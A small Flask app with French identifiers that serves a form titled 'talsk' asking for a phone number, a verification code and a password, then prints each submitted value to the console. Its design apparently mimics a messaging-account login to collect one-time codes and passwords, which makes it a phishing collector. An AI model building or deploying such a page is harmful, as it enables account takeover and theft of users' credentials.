from flask import Flask, request

app = Flask(__name__)

@app.route("/")
def accueil():
    return """
    <h1>talsk</h1>

    <form method="POST" action="/recevoir">
        <input name="numérodetéléphone" placeholder="numérodetéléphone">
        <input name="code" placeholder="code">
        <input name="motdepasse" placeholder="motdepasse">

        <button type="submit">Envoyer</button>
    </form>
    """

@app.route("/recevoir", methods=["POST"])
def recevoir():
    numérodetéléphone = request.form.get("numérodetéléphone")
    code = request.form.get("code")
    motdepasse = request.form.get("motdepasse")

    print("numérodetéléphone:", numérodetéléphone)
    print("code:", code)
    print("motdepasse :", motdepasse)
    
    return "les 3 messages on etait recu"
